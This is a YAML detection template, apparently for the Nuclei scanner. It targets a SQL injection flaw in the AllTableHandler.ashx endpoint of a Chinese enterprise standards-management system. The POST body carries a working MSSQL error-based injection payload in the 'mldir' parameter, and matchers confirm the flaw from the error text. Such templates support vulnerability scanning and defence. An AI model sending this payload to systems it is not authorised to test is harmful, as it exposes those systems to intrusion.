id: poc-yaml-run-shen-information-esms-alltablehandler-ashx-sqli
info:
  name: 润申信息企业标准化管理系统 AllTableHandler.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/PDCA/ashx/AllTableHandler.ashx?action=GetAll"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      IsOrder=4&mldir=%28SELECT+CONCAT%28CONCAT%28sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%2C%28CASE+WHEN+%287759%3D7759%29+THEN+CHAR%2832%29+ELSE+CHAR%2848%29+END%29%29%2CCHAR%2832%29%29%29&zydir=&code=&status=1%2C2%2C3%2C4&page=1&rows=30
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "&nbsp"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
